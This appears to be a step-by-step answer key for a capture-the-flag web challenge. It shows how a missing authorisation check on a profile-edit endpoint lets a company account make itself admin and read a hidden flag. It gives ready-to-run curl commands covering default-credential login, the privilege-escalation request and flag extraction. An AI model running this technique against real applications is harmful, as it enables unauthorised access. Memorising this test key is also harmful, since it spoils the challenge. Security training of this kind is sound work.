# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Broken access control / IDOR. `POST /edit_profile/{company_id}`
accepts an `is_admin` form field and saves it with no check that the caller is
allowed to set it (and no check that the JWT subject matches `company_id`). A
company can grant itself admin, which unlocks a private "secret" job containing
the flag.

1. **Log in** as the demo company with default creds `demo` / `demo` (this is
   company_id 1), saving the token cookie:

   ```
   curl -s -c cookies.txt -d "username=demo&password=demo" http://<target>/token -o /dev/null
   ```

2. **Confirm** that as a normal (non-admin) company only the public job shows:

   ```
   curl -s -b cookies.txt http://<target>/company/1/jobs
   ```

3. **Exploit the IDOR** — set your own `is_admin=true` via the unguarded POST
   endpoint (include `name` or it errors):

   ```
   curl -s -b cookies.txt -d "name=demo&is_admin=true" http://<target>/edit_profile/1 -o /dev/null -w "HTTP:%{http_code}\n"
   ```

4. **Re-fetch the jobs** — the private "secret" job (with the flag) is now
   visible:

   ```
   curl -s -b cookies.txt http://<target>/company/1/jobs
   ```

5. **Extract the flag** (`FLAG{...}`) from the jobs listing and report it
   verbatim.
